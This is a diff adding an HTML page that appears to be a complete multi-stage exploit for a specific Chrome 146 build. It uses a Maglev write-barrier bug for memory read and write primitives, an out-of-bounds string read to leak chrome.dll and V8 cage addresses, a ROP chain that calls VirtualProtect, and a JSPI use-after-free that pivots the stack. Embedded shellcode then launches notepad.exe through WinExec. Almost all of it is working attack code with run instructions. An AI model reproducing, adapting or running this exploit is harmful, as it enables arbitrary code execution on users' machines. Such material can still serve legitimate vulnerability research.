@@ -1,0 +1,633 @@
+<!doctype html>
+<html><head><title>Chrome 146 Renderer Exploit</title></head>
+<body>
+<pre id="log" style="font:13px/1.6 monospace;padding:16px"></pre>
+<script>
+// ============================================================================
+//  Chrome 146.0.7680.208 -- Renderer Exploit
+//
+//  Achieves arbitrary code execution in an unsandboxed renderer process.
+//  Launches notepad.exe as proof via WinExec.
+//
+//  STAGE 1   Maglev write-barrier elision -> addrOf / fakeObj / r32 / w32
+//  STAGE 2a  chrome.loadTimes ExternalString OOB read -> chrome.dll BASE + CAGE
+//  STAGE 2b  ROP chain written into a FixedDoubleArray -> VirtualProtect -> RWX
+//  STAGE 3   JSPI cross-suspender unwind -> StackMemory freed (UAF setup)
+//  STAGE 4   Reclaim StackMemory with fake jmpbuf -> stale callback -> shellcode
+//
+//  Run:  chrome.exe --no-sandbox http://localhost:8000/poc.html
+//  Host: python3 -m http.server 8000
+// ============================================================================
+
+const logEl = document.getElementById('log');
+function log(s) { logEl.textContent += s + '\n'; console.log(s); }
+function die(s) { log('[FAIL] ' + s); throw new Error(s); }
+function hex(x) { return '0x' + (x >>> 0).toString(16); }
+
+// -- Type-punning buffers (float64 <-> uint32/int32, used everywhere) ----------
+const f64 = new Float64Array(1); f64[0] = 11.0;
+const cvBuf = new ArrayBuffer(8);
+const cvF = new Float64Array(cvBuf);
+const cvU = new Uint32Array(cvBuf);
+const cvI = new Int32Array(cvBuf);
+
+// -- Per-build V8 constants (compressed root-object offsets in the V8 cage) --
+const DOUBLE_MAP = 0x1032999;  // Map for PACKED_DOUBLE JSArrays
+const HN_MAP     = 0x515;     // HeapNumber map
+const EMPTY_FA   = 0x7bd;     // empty_fixed_array root
+const TERM_EX    = 0xefffc;   // TerminationException singleton
+const FDA_MAP    = 0x911;     // FixedDoubleArray map
+
+// -- Per-build chrome.dll ROP gadget RVAs (from utils/retune.sh) -------------
+const ROP_GADGETS = {
+  pushrsp_rcx:    0x0c1be12fn,  // push rsp; pop rcx; ret  (sets rcx = FDA page for VirtualProtect)
+  pop_rdx:        0x0000639an,  // pop rdx; ret
+  pop_r8:         0x002a0991n,  // pop r8;  ret
+  pop_r9:         0x0004031an,  // pop r9;  ret
+  jmp_rsp:        0x00086093n,  // jmp rsp  (jump into shellcode after ROP)
+  add_rsp_20_ret: 0x02cbf3a0n,  // add rsp, 0x20; ret  (skip VirtualProtect shadow space)
+  a_bss:          0x0ff27000n,  // writable .bss address (temp stack + VirtualProtect scratch)
+};
+
+// -- Per-build ext_str OOB offsets (chrome.loadTimes function internals) ------
+const EXT = {
+  vtbl_off: 0x14b,     // offset to chrome.dll vtable ptr -> derive BASE
+  cage_off: 0x3dc42b,  // offset to V8 cage base global   -> derive CAGE
+  vp_off:   0x1d8323,  // offset to _imp_VirtualProtect   -> VirtualProtect address
+  vtbl_rva: 0xe878c37, // RVA of the vtable -> BASE = vtbl_ptr - vtbl_rva
+};
+
+const WAIT_MS = 4000;  // delay after resolve1() for GC to free StackMemory
+
+// -- JSPI setup: create the secondary StackMemory we will UAF ----------------
+//
+// This Wasm module does:  main() { call suspend(); call throw_termination(); }
+//
+// WebAssembly.promising() wraps main to use JSPI: calling suspend() suspends
+// execution onto a freshly-allocated secondary StackMemory and returns a
+// Promise (sp1).  Later, resolving sp1 resumes execution, which immediately
+// calls throw_termination() -- the throw unwinds across the suspender boundary,
+// causing V8 to free the secondary StackMemory.  But the promise reaction's
+// fulfill handler still holds a reference to the freed StackMemory's jmpbuf.
+//
+// (module
+//   (import "m" "s" (func $suspend))
+//   (import "m" "x" (func $throw_termination))
+//   (func $main  (call $suspend) (call $throw_termination))
+//   (export "main" (func $main)))
+
+const WASM_BYTES = new Uint8Array([
+  0,97,115,109,1,0,0,0,1,10,3,96,0,0,96,0,0,96,0,0,2,13,2,1,109,1,115,0,0,1,109,
+  1,120,0,1,3,2,1,2,7,8,1,4,109,97,105,110,0,2,10,8,1,6,0,16,0,16,1,11]);
+
+var term_ex_holder = null, stale_cb = null, resolve1;
+let sp1 = new Promise(r => resolve1 = r);
+
+WebAssembly.promising(new WebAssembly.Instance(
+  new WebAssembly.Module(WASM_BYTES),
+  { m: {
+      s: new WebAssembly.Suspending(() => sp1),
+      x: () => { throw term_ex_holder; }
+  }}
+).exports.main)().catch(() => {});
+
+// -- holder: 160KB FixedDoubleArray in large-object space --------------------
+// After the leak, we write the ROP chain + shellcode into this array.
+// VirtualProtect makes its backing store page RWX; the stale callback
+// pivots rsp here and the chain executes in-place.
+let holder = new Array(20000).fill(1.1);
+let rop_arg = null;
+
+// ============================================================================
+//  STAGE 1: Maglev JIT write-barrier elision -> r32 / w32 / addrOf / fakeObj
+// ============================================================================
+//
+// Maglev (V8's mid-tier JIT) optimizes stores to let-bound variables by
+// eliding the write barrier when it believes the target cell still holds a
+// Smi.  We create four structurally-identical "cell triplets" (a/b/c), warm
+// them with Smi stores so Maglev compiles the trigger function without a
+// write barrier, then call pocT(f64[0]) which stores a HeapObject (a double
+// from a Float64Array) into cT *without* updating the remembered set.
+//
+// When the GC later promotes the spray arrays but doesn't trace cT's slot,
+// cT still points into the now-repurposed young-gen memory.  By spraying
+// arrays filled with 0x515 (HeapNumber map), cT becomes a fake HeapNumber
+// overlapping a double-array element -- giving us read/write of the element
+// via cT's "value" field and of cT's "map" via the spray slot.
+
+const kJSPromise_reactions    = 0x0c;
+const kPromiseReaction_fulfill = 0x10;
+const kSM_size = 176;  // StackMemory allocation size
+
+const scanBuf = new Int32Array(2048);
+const SMI_LO = 0x1badc0de, SMI_TAG = (SMI_LO << 1) >>> 0;
+
+// Forge values for the fake empty PACKED_DOUBLE JSArray (variant E).
+cvU[0] = EMPTY_FA; cvU[1] = 0;        const E_A1 = cvF[0];
+cvU[0] = EMPTY_FA; cvU[1] = EMPTY_FA; const E_B1 = cvF[0];
+cvU[0] = 0;        cvU[1] = HN_MAP;   const E_B2 = cvF[0];
+
+// Cell triplets: three dummies (pocD1-3) + one real target (pocT).
+// The a/b/c pattern within each triplet is what triggers the elision.
+let aD1=0;aD1=0x40000000;let bD1=11;var cD1=0;cD1=1;
+let aD2=0;aD2=0x40000000;let bD2=11;var cD2=0;cD2=1;
+let aD3=0;aD3=0x40000000;let bD3=11;var cD3=0;cD3=1;
+let aT =0;aT =0x40000000;let bT =11;var cT =0;cT =1;
+function pocD1(x) { aD1 = x; bD1 = x; cD1 = x; }
+function pocD2(x) { aD2 = x; bD2 = x; cD2 = x; }
+function pocD3(x) { aD3 = x; bD3 = x; cD3 = x; }
+function pocT(x)  { aT = x;  bT = x;  cT = x;  }
+
+// Warm up: Maglev compiles all four trigger functions with Smi-only feedback.
+(function() {
+  for (let i = 0; i < 3000; i++) { pocD1(11); pocD2(11); pocD3(11); pocT(11); }
+  let j = 0; for (let i = 0; i < 1000000; i++) j += i;  // stall for compilation
+  for (let i = 0; i < 1000; i++) { pocD1(11); pocD2(11); pocD3(11); pocT(11); }
+})();
+
+let obj_arr = [{}, SMI_LO];
+let obj_sentinel = {};
+
+// Scan helpers -- JIT-compiled for zero-allocation scanning of double arrays.
+// scan1: find the sentinel SMI_TAG in a double array (returns encoded index).
+// rd32 / wr32: read/write a 32-bit value at a byte offset within a double array.
+// leakScan: find heap-pointer-like values (hi16 in [0x7ff0, 0x7fff]).
+function scan1(arr, lo, hi) {
+  for (let i = lo; i < hi; i++) {
+    cvF[0] = arr[i];
+    if (cvI[0] === (SMI_TAG | 0)) return (i << 1);
+    if (cvI[1] === (SMI_TAG | 0)) return (i << 1) | 1;
+  }
+  return -1;
+}
+function rd32(arr, a) {
+  cvF[0] = arr[((a & ~7) - 8) >>> 3];
+  return (a & 4) ? cvI[1] : cvI[0];
+}
+function wr32(arr, a, v) {
+  let al = a & ~7;
+  cvF[0] = arr[(al - 8) >>> 3];
+  if (a & 4) cvI[1] = v | 0; else cvI[0] = v | 0;
+  arr[(al - 8) >>> 3] = cvF[0];
+}
+function leakScan(arr, lo, hi, out) {
+  let n = 0;
+  for (let i = lo; i < hi; i++) {
+    cvF[0] = arr[i];
+    let h = cvI[1] | 0, l = cvI[0] | 0;
+    if (h >= 0x7ff0 && h <= 0x7fff && l !== 0) { out[n] = i; out[n+1] = 0; n += 2; }
+    if (l >= 0x7ff0 && l <= 0x7fff) { out[n] = i; out[n+1] = 1; n += 2; }
+    if (n >= 2046) break;
+  }
+  return n;
+}
+
+// ph25: identify which specific spray array cT overlaps.
+let s_found = -1, pool = null, nfp = 0;
+const ELEMS = 256, NSPRAY = 600;
+let spray = new Array(NSPRAY), template;
+
+function ph25() {
+  for (let s = 0; s < NSPRAY; s++)  spray[s][found_k]  = MARK;
+  for (let s = 0; s < NCHURN; s++)  spray2[s][found_k] = MARK;
+  if (align === 0) {
+    for (let s = 0; s < NCHURN; s++) {
+      spray2[s][found_k] = V515; cvF[0] = cT;
+      if (cvI[0] !== 0x517) { s_found = s; pool = spray2; return; }
+      spray2[s][found_k] = MARK;
+    }
+    for (let s = 0; s < NSPRAY; s++) {
+      spray[s][found_k] = V515; cvF[0] = cT;
+      if (cvI[0] !== 0x517) { s_found = s; pool = spray; return; }
+      spray[s][found_k] = MARK;
+    }
+  } else {
+    for (let s = 0; s < NCHURN; s++) {
+      spray2[s][found_k] = V515;
+      if (typeof cT === 'number') { s_found = s; pool = spray2; return; }
+      spray2[s][found_k] = MARK;
+    }
+    for (let s = 0; s < NSPRAY; s++) {
+      spray[s][found_k] = V515;
+      if (typeof cT === 'number') { s_found = s; pool = spray; return; }
+      spray[s][found_k] = MARK;
+    }
+  }
+}
+
+// Spray: fill young-gen with 600 arrays of 256 doubles, each element = HN_MAP|HN_MAP.
+// This creates a "sea of 0x515" that cT will dangle into after the write-barrier miss.
+(function() {
+  cvU[0] = HN_MAP; cvU[1] = HN_MAP; let V = cvF[0];
+  template = [V];
+  for (let e = 1; e < ELEMS; e++) template.push(V);
+  for (let s = 0; s < NSPRAY; s++) spray[s] = template.slice();
+})();
+
+// Second warm-up: ensure scan helpers are JIT-compiled before the trigger.
+(function() {
+  for (let i = 0; i < 5000; i++) { pocD1(11); pocD2(11); pocD3(11); pocT(11); }
+  for (let w = 0; w < 5000; w++) {
+    scan1(template, 0, 256); rd32(template, 16); leakScan(template, 0, 256, scanBuf);
+  }
+  let j = 0; for (let i = 0; i < 2000000; i++) j += i;
+  for (let i = 0; i < 2000; i++) { pocD1(11); pocD2(11); pocD3(11); pocT(11); }
+  for (let w = 0; w < 2000; w++) {
+    scan1(template, 0, 256); rd32(template, 16); leakScan(template, 0, 256, scanBuf);
+  }
+})();
+
+// ----------------------- begin zero-alloc zone ------------------------------
+// -- THE TRIGGER: store a HeapObject (Float64Array element) into cT ----------
+// Maglev already compiled pocT with no write barrier -- this store escapes the
+// remembered set.  After the churn spray triggers a GC that promotes the 0x515
+// arrays, cT's slot isn't traced and now points into reused young-gen memory.
+pocT(f64[0]);
+
+// Churn spray: allocate more arrays to trigger minor GC and repurpose the memory.
+const CHB = 1100, CHM = 20;
+let spray2 = new Array(CHB * CHM), _n = 0;
+(function() {
+  for (let r = 0; r < CHM; r++) {
+    for (let s = 0; s < CHB; s++) spray2[_n++] = template.slice();
+    if (typeof cT !== 'number') return;
+    cvF[0] = cT; if (cvU[1] !== 0x40260000) return;
+  }
+})();
+const NCHURN = _n;
+
+// -- Phase 1: confirm cT is dangling into the 0x515 sea ---------------------
+if (typeof cT !== 'number') die('cT on slice header (not dangling into doubles)');
+cvF[0] = cT;
+if (cvU[0] !== HN_MAP || cvU[1] !== HN_MAP)
+  die('phase-1 miss: cT = ' + hex(cvU[1]) + '_' + hex(cvU[0]) + ' churn=' + NCHURN);
+log('[1] cT dangling into 0x515 sea (churn arrays: ' + NCHURN + ')');
+
+// -- Phase 2: find which spray element index cT overlaps ---------------------
+cvU[0] = HN_MAP; cvU[1] = 0x517; let MARK = cvF[0];
+cvU[0] = HN_MAP; cvU[1] = HN_MAP; let V515 = cvF[0];
+let found_k = -1, align = -1;
+(function() {
+  for (let k = 0; k < ELEMS; k++) {
+    for (let s = 0; s < NSPRAY; s++)  spray[s][k]  = MARK;
+    for (let s = 0; s < NCHURN; s++)  spray2[s][k] = MARK;
+    if (typeof cT !== 'number') { found_k = k; align = 4; return; }
+    cvF[0] = cT;
+    if (cvU[0] === 0x517) { found_k = k; align = 0; return; }
+    if (cvU[1] === 0x517) { found_k = k - 1; align = 4; return; }
+    for (let s = 0; s < NSPRAY; s++)  spray[s][k]  = V515;
+    for (let s = 0; s < NCHURN; s++)  spray2[s][k] = V515;
+  }
+})();
+if (found_k < 0) die('phase-2 probe failed (could not locate cT in spray)');
+log('[1] cT at spray element [' + found_k + '] alignment +' + align);
+
+// -- Phase 2.5: which specific array does cT overlap? ------------------------
+ph25();
+if (s_found < 0) die('phase-2.5 failed (could not identify source array)');
+log('[1] s_found = ' + s_found + ' (pool = ' + (pool === spray2 ? 'spray2' : 'spray') + ')');
+
+// -- Phase 3a: forge cT as a valid empty PACKED_DOUBLE JSArray ---------------
+// Writing cT[0] = 1.1 forces V8 to allocate a new FixedDoubleArray backing
+// store in young-gen.  The compressed pointer to that FDA appears in
+// pool[s_found]'s element data -- this is our "nfp" (nearby-fresh-pointer)
+// anchor: a known-committed address near our upcoming obj_arr.
+let H_A0, H_A1, H_B0, H_B1, H_B2;
+cvU[0] = DOUBLE_MAP; cvU[1] = EMPTY_FA;    H_A0 = cvF[0];
+cvU[0] = 1;          cvU[1] = 0x7ffffffe;  H_A1 = cvF[0];
+cvU[0] = HN_MAP;     cvU[1] = DOUBLE_MAP;  H_B0 = cvF[0];
+cvU[0] = EMPTY_FA;   cvU[1] = 1;           H_B1 = cvF[0];
+cvU[0] = 0x7ffffffe; cvU[1] = HN_MAP;      H_B2 = cvF[0];
+
+if (align === 0) {
+  pool[s_found][found_k]     = H_A0;
+  pool[s_found][found_k + 1] = E_A1;
+} else {
+  pool[s_found][found_k]     = H_B0;
+  pool[s_found][found_k + 1] = E_B1;
+  pool[s_found][found_k + 2] = E_B2;
+}
+cT[0] = 1.1;
+cvF[0] = pool[s_found][found_k + 1];
+nfp = (align === 0 ? cvI[0] : cvI[1]) - 1;
+if (nfp <= 0 || cT[0] !== 1.1) die('phase-3a nfp leak failed, nfp = ' + hex(nfp));
+log('[1] nfp (nearby fresh pointer) = ' + hex(nfp));
+
+// -- Phase 3b: allocate obj_arr right next to nfp, then scan for it ----------
+// Re-forge cT as a cage-wide reader (large length) and scan the narrow
+// [nfp, nfp+1KB) region for our SMI sentinel -- that locates obj_arr's
+// element storage, giving us addrOf and fakeObj.
+obj_arr = [obj_sentinel, SMI_LO];
+
+if (align === 0) {
+  pool[s_found][found_k]     = H_A0;
+  pool[s_found][found_k + 1] = H_A1;
+} else {
+  pool[s_found][found_k]     = H_B0;
+  pool[s_found][found_k + 1] = H_B1;
+  pool[s_found][found_k + 2] = H_B2;
+}
+
+let oa_elem0 = -1;
+{
+  let lo = (nfp & ~7) >>> 3, hi = ((nfp + 1024) & ~7) >>> 3, i = lo;
+  while (i < hi) {
+    let h = scan1(cT, i, hi);
+    if (h < 0) break;
+    let cand = (h & 1) ? ((h >>> 1) * 8 + 12 - 4) : ((h >>> 1) * 8 + 8 - 4);
+    i = (h >>> 1) + 1;
+    let v0 = rd32(cT, cand);
+    if ((v0 & 1) !== 1) continue;
+    obj_arr[0] = obj_arr;    // self-reference -> changes the value at cand
+    let v1 = rd32(cT, cand);
+    obj_arr[0] = obj_sentinel;
+    if (v1 !== v0 && (v1 & 1) === 1) { oa_elem0 = cand; break; }
+  }
+}
+if (oa_elem0 < 0) die('phase-3 obj_arr scan failed, nfp = ' + hex(nfp));
+log('[1] obj_arr elements[0] found at cage offset ' + hex(oa_elem0));
+
+// -- Primitives: addrOf / fakeObj / r32 / w32 --------------------------------
+function r32(a)    { return rd32(cT, a) >>> 0; }
+function w32(a, v) { wr32(cT, a, v); }
+function addrOf(o) { obj_arr[0] = o; return r32(oa_elem0) - 1; }
+function fakeObj(a) { w32(oa_elem0, (a | 1) >>> 0); return obj_arr[0]; }
+
+// Self-test: write obj_arr.length via w32, read it back.
+obj_arr[0] = obj_arr;
+let oa = r32(oa_elem0) - 1;
+w32(oa + 12, 1337 << 1);
+if (obj_arr.length !== 1337 || fakeObj(oa) !== obj_arr) die('primitives self-test failed');
+w32(oa + 12, 2 << 1);
+log('[1] STAGE 1 COMPLETE -- addrOf / fakeObj / r32 / w32');
+// ------------------------ end zero-alloc zone -------------------------------
+
+// ============================================================================
+//  STAGE 2a: chrome.loadTimes ext_str OOB -> chrome.dll BASE + V8 CAGE
+// ============================================================================
+//
+// chrome.loadTimes is a built-in function whose SharedFunctionInfo -> Script ->
+// source is an ExternalOneByteString.  Its resource_data pointer points into
+// chrome.dll's .rdata section.  By temporarily extending the string's length,
+// charCodeAt(offset) reads arbitrary bytes relative to that .rdata pointer:
+//
+//   +0x14b:    chrome.dll vtable pointer  -> subtract vtbl_rva -> BASE
+//   +0x3dc42b: V8 cage base global        -> CAGE
+//   +0x1d8323: _imp_VirtualProtect         -> VirtualProtect address
+
+const lt_addr  = addrOf(chrome.loadTimes) >>> 0;
+const sfi      = (r32(lt_addr + 0x10) - 1) >>> 0;  // SharedFunctionInfo
+const script   = (r32(sfi + 0x14) - 1) >>> 0;       // Script
+const ext_str  = (r32(script + 4) - 1) >>> 0;        // ExternalOneByteString
+
+const ext_map = r32(ext_str);
+if (ext_map !== 0x335) die('ext_str map unexpected: ' + hex(ext_map) + ' (expected 0x335)');
+
+const orig_len = r32(ext_str + 8);
+w32(ext_str + 8, 0x0fffffff);   // extend length for OOB read
+const ext_obj = fakeObj(ext_str);
+
+function readDword(offset) {
+  let v = 0;
+  for (let i = 0; i < 4; i++) v |= ext_obj.charCodeAt(offset + i) << (8 * i);
+  return v >>> 0;
+}
+
+const vtbl_lo = readDword(EXT.vtbl_off);
+const vtbl_hi = readDword(EXT.vtbl_off + 4);
+const cage_lo = readDword(EXT.cage_off);
+const cage_hi = readDword(EXT.cage_off + 4);
+const vp_lo   = readDword(EXT.vp_off);
+const vp_hi   = readDword(EXT.vp_off + 4);
+
+w32(ext_str + 8, orig_len);     // restore original length
+
+const BASE = (BigInt(vtbl_hi) << 32n | BigInt(vtbl_lo)) - BigInt(EXT.vtbl_rva);
+const CAGE = BigInt(cage_hi) << 32n | BigInt(cage_lo);
+const VP   = BigInt(vp_hi) << 32n | BigInt(vp_lo);
+
+if ((BASE & 0xffffn) !== 0n || (CAGE & 0xffffffffn) !== 0n || !VP)
+  die('ext_str leak sanity failed: BASE=' + BASE.toString(16)
+      + ' CAGE=' + CAGE.toString(16) + ' VP=' + VP.toString(16));
+
+log('[2a] BASE = 0x' + BASE.toString(16));
+log('[2a] CAGE = 0x' + CAGE.toString(16));
+log('[2a] VirtualProtect = 0x' + VP.toString(16));
+
+// ============================================================================
+//  STAGE 2b: ROP chain -> VirtualProtect -> RWX shellcode execution
+// ============================================================================
+//
+// The holder array's FixedDoubleArray backing store lives in large-object space.
+// We write the ROP chain into its element slots.  After the JSPI UAF in Stage 4,
+// the fake jmpbuf pivots rsp into this FDA:
+//
+//   jmpbuf.pc = push_rsp_pop_rcx_ret  -> rcx = FDA page address
+//   jmpbuf.sp = CAGE + FDA + 9        -> rsp lands at slot 1
+//
+// The chain calls VirtualProtect(rcx=FDA_page, 1, PAGE_EXECUTE_READWRITE, &bss)
+// to make the page executable, then jumps into the shellcode written after it.
+//
+// Slot layout:
+//   1:  pop rdx; ret         2:  1               (dwSize)
+//   3:  pop r8;  ret         4:  0x40             (PAGE_EXECUTE_READWRITE)
+//   5:  pop r9;  ret         6:  &a_bss           (lpflOldProtect scratch)
+//   7:  VirtualProtect       8:  add rsp,0x20;ret (skip shadow space)
+//   9-12: padding (shadow space)
+//   13: jmp rsp              -> falls through to shellcode
+//   14+: [mov r15, BASE; mov rsp, a_bss;] + shellcode bytes
+
+const G = {};
+for (const [k, rva] of Object.entries(ROP_GADGETS)) G[k] = BASE + rva;
+G.vp = VP;
+
+const dv = new DataView(new ArrayBuffer(8));
+function setSlot(s, q) {
+  dv.setBigUint64(0, (q & 0x00ffffffffffffffn) << 8n, true);
+  holder[s - 1] = dv.getFloat64(0, true);
+}
+
+let R = 1;
+setSlot(R + 0,  G.pop_rdx);          // pop rdx; ret
+setSlot(R + 1,  1n);                  // rdx = dwSize = 1
+setSlot(R + 2,  G.pop_r8);           // pop r8;  ret
+setSlot(R + 3,  0x40n);              // r8  = PAGE_EXECUTE_READWRITE
+setSlot(R + 4,  G.pop_r9);           // pop r9;  ret
+setSlot(R + 5,  G.a_bss);            // r9  = scratch address for old-protect
+setSlot(R + 6,  G.vp);               // VirtualProtect
+setSlot(R + 7,  G.add_rsp_20_ret);   // skip shadow space after VP returns
+for (let s = R + 8; s <= R + 11; s++) setSlot(s, 0n);  // shadow space padding
+setSlot(R + 12, G.jmp_rsp);          // jump into shellcode
+
+// Locate holder's FDA in the cage.
+let H = r32(addrOf(holder) + 8) - 1;
+if (r32(H) !== FDA_MAP) die('holder.elements not FDA (map = ' + hex(r32(H)) + ')');
+rop_arg = fakeObj(H);
+
+log('[2b] ROP chain at FDA ' + hex(H) + ', jmpbuf.sp = 0x' + (CAGE + BigInt(H) + 9n).toString(16));
+
+// ============================================================================
+//  STAGE 2c: arm the JSPI stale callback + fakeObj(TerminationException)
+// ============================================================================
+//
+// Walk sp1's promise internals to extract the fulfill handler -- this is the
+// callback that, after resolve1() and the cross-suspender throw, will try to
+// resume from the (freed) StackMemory's jmpbuf.  We'll reclaim that memory
+// with our fake jmpbuf before calling it.
+
+let rc = r32(addrOf(sp1) + kJSPromise_reactions);
+if ((rc & 1) === 0) die('sp1 has no reaction chain');
+stale_cb = fakeObj(r32(rc - 1 + kPromiseReaction_fulfill) - 1);
+term_ex_holder = fakeObj(TERM_EX);
+
+// -- Clean up: restore spray, neutralize cT ----------------------------------
+// cT is no longer needed.  Restore the spray elements to valid HeapNumber maps
+// and null out the cell triplet variables so GC won't trace stale pointers.
+(function() {
+  let k = found_k;
+  pool[s_found][k] = V515; pool[s_found][k+1] = V515;
+  if (align) pool[s_found][k+2] = V515;
+  for (let s = 0; s < NSPRAY; s++) {
+    spray[s][k] = V515; spray[s][k+1] = V515;
+    if (align) spray[s][k+2] = V515;
+  }
+  for (let s = 0; s < NCHURN; s++) {
+    spray2[s][k] = V515; spray2[s][k+1] = V515;
+    if (align) spray2[s][k+2] = V515;
+  }
+})();
+cT = 0; cD1 = 0; cD2 = 0; cD3 = 0;
+obj_arr[0] = obj_sentinel;
+
+log('[2c] stale callback + TerminationException armed');
+(function() { let j = 0; for (let i = 0; i < 8000000; i++) j += i; })();
+
+// ============================================================================
+//  STAGE 3: resolve the suspended promise -> cross-suspender throw -> UAF
+// ============================================================================
+//
+// resolve1() resumes the Wasm suspender.  The resumed code calls throw(), which
+// throws fakeObj(TerminationException) across the suspender boundary.  V8's
+// cross-suspender unwind frees the secondary StackMemory -- but the promise
+// reaction's fulfill handler still references the freed jmpbuf.
+
+log('[3] resolving sp1 -- StackMemory will be freed by cross-suspender unwind');
+resolve1();
+
+// ============================================================================
+//  STAGE 4: reclaim StackMemory, write shellcode, fire stale callback
+// ============================================================================
+//
+// We need one async yield so the event loop turns and the StackMemory is
+// actually freed by GC.  Then we spray WebAssembly.Module objects (whose
+// custom sections are exactly kSM_size bytes) to reclaim the freed memory
+// with our fake jmpbuf.  Calling stale_cb() triggers LoadJumpBuffer on
+// the reclaimed memory -- pivoting rsp to our ROP chain.
+
+log('[4] waiting ' + WAIT_MS + 'ms for GC to free StackMemory...');
+
+// The shellcode: resolve WinExec via chrome.dll IAT -> WinExec("notepad.exe",1).
+// See payload.asm for source; hand-assembled for portability (no nasm needed).
+const SHELLCODE = new Uint8Array([
+  0x49,0x89,0xE6,                                          // mov r14, rsp
+  0x48,0x81,0xEC,0x00,0x08,0x00,0x00,                      // sub rsp, 0x800
+  0x48,0x83,0xE4,0xF0,                                     // and rsp, -16
+  0x49,0x8D,0x8F,0xF2,0xD5,0xD8,0x0F,                      // lea rcx, [r15+KERNEL32]
+  0x49,0x8B,0x87,0xC8,0xA0,0xD8,0x0F,                      // mov rax, [r15+GetModuleHandleA]
+  0x48,0x83,0xEC,0x20,0xFF,0xD0,0x48,0x83,0xC4,0x20,       // shadow call rax
+  0x48,0x89,0xC1,                                           // mov rcx, rax (hKernel32)
+  0x48,0xBA,0x57,0x69,0x6E,0x45,0x78,0x65,0x63,0x00,       // mov rdx, "WinExec\0"
+  0x49,0x89,0x96,0x70,0x01,0x00,0x00,                       // mov [r14+0x170], rdx
+  0x49,0x8D,0x96,0x70,0x01,0x00,0x00,                       // lea rdx, [r14+0x170]
+  0x49,0x8B,0x87,0x30,0xA1,0xD8,0x0F,                      // mov rax, [r15+GetProcAddress]
+  0x48,0x83,0xEC,0x20,0xFF,0xD0,0x48,0x83,0xC4,0x20,       // shadow call rax
+  0x49,0x89,0xC3,                                           // mov r11, rax (WinExec)
+  0x48,0xB8,0x6E,0x6F,0x74,0x65,0x70,0x61,0x64,0x2E,       // mov rax, "notepad."
+  0x49,0x89,0x86,0x78,0x01,0x00,0x00,                       // mov [r14+0x178], rax
+  0x41,0xC7,0x86,0x80,0x01,0x00,0x00,0x65,0x78,0x65,0x00,  // mov dword [r14+0x180], "exe\0"
+  0x49,0x8D,0x8E,0x78,0x01,0x00,0x00,                       // lea rcx, [r14+0x178]
+  0xBA,0x01,0x00,0x00,0x00,                                 // mov edx, 1
+  0x4C,0x89,0xD8,                                           // mov rax, r11
+  0x48,0x83,0xEC,0x20,0xFF,0xD0,0x48,0x83,0xC4,0x20,       // shadow call rax -> WinExec
+  0x0F,0x0B,                                                // ud2 (kill tab)
+]);
+
+(async () => {
+  // Yield to the event loop -- this is critical.  resolve1() only *scheduled*
+  // the JSPI resumption as a microtask.  The StackMemory is not freed until
+  // the event loop actually runs that microtask and the cross-suspender throw
+  // completes.  A busy-wait here (no yield) would mean the memory is never
+  // freed and the reclaim spray finds nothing.
+  await new Promise(r => setTimeout(r, WAIT_MS));
+
+  // Write shellcode into holder[] starting at slot R+12 (after jmp_rsp).
+  // The JS prefix sets r15 = chrome_base and rsp = a_bss before the payload.
+  function imm64(b, q) {
+    for (let i = 0; i < 8; i++) { b.push(Number(q & 0xffn)); q >>= 8n; }
+  }
+  let SC = [0x49, 0xbf]; imm64(SC, BASE);                    // mov r15, BASE
+  SC.push(0x48, 0xb8);   imm64(SC, G.a_bss); SC.push(0x48, 0x89, 0xc4); // mov rsp, a_bss
+  for (let i = 0; i < SHELLCODE.length; i++) SC.push(SHELLCODE[i]);
+
+  let hi = R + 12;
+  dv.setBigUint64(0, 0n, true);
+  for (let j = 0; j < 7 && j < SC.length; j++) dv.setUint8(1 + j, SC[j]);
+  holder[hi++] = dv.getFloat64(0, true);
+  for (let off = 7; off < SC.length; off += 8) {
+    dv.setBigUint64(0, 0n, true);
+    for (let j = 0; j < 8 && off + j < SC.length; j++) dv.setUint8(j, SC[off + j]);
+    holder[hi++] = dv.getFloat64(0, true);
+  }
+  log('[4] shellcode: ' + SHELLCODE.length + 'B payload -> holder[' + (R+12) + '..' + hi + ']');
+
+  // Reclaim the freed StackMemory.
+  // Each WebAssembly.Module with a custom section of exactly kSM_size bytes
+  // allocates a buffer that V8's allocator may place in the freed slot.
+  // The custom section contains our fake jmpbuf with sp/pc pointing at the
+  // ROP chain in holder.
+  const SP = CAGE + BigInt(H) + 9n;
+  const FP = G.a_bss;
+  const PC = G.pushrsp_rcx;
+
+  function makeFakeStackMemory(idx) {
+    let b = new Uint8Array(kSM_size);
+    let d = new DataView(b.buffer);
+    b.set([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0], 0);  // Wasm magic + version
+    b[8] = 0; b[9] = 0xA5; b[10] = 1; b[11] = 0;   // custom section header
+    d.setBigUint64(0x18, SP, true);   // jmpbuf.sp  -> ROP chain in FDA
+    d.setBigUint64(0x20, FP, true);   // jmpbuf.fp  -> a_bss
+    d.setBigUint64(0x28, PC, true);   // jmpbuf.pc  -> push rsp; pop rcx; ret
+    d.setUint32(0x44, 1, true);       // state = active
+    d.setBigUint64(0x38, 0n, true);   // parent = null
+    d.setUint8(0x40, 0);              // is_on_central = false
+    d.setUint32(kSM_size - 4, idx, true);
+    return b;
+  }
+
+  const N_PRESS = 16, N_MOD = 2048;
+  let bufs = new Array(N_MOD);
+  for (let i = 0; i < N_MOD; i++) bufs[i] = makeFakeStackMemory(i);
+
+  let mods = new Array(N_MOD), pressure = new Array(N_PRESS), m = 0;
+  log('[4] spraying ' + N_MOD + ' WasmModules (' + kSM_size + 'B each) to reclaim StackMemory');
+  for (let i = 0; i < N_PRESS; i++) {
+    try { pressure[i] = new ArrayBuffer(256 * 1024 * 1024); } catch (e) {}
+    for (let j = 0; j < 128 && m < N_MOD; j++, m++)
+      mods[m] = new WebAssembly.Module(bufs[m]);
+  }
+
+  void holder.length;  // prevent holder from being GC'd
+
+  log('[4] firing stale callback -> jmpbuf pivot -> ROP -> VirtualProtect -> shellcode');
+  log('----------------------------------------------------------------');
+
+  try {
+    stale_cb(rop_arg);
+    log('[-] callback returned -- StackMemory reclaim missed (retry)');
+  } catch (e) {
+    log('[!] exception: ' + ((e && e.stack) || e));
+  }
+})();
+</script>
+</body>
+</html>
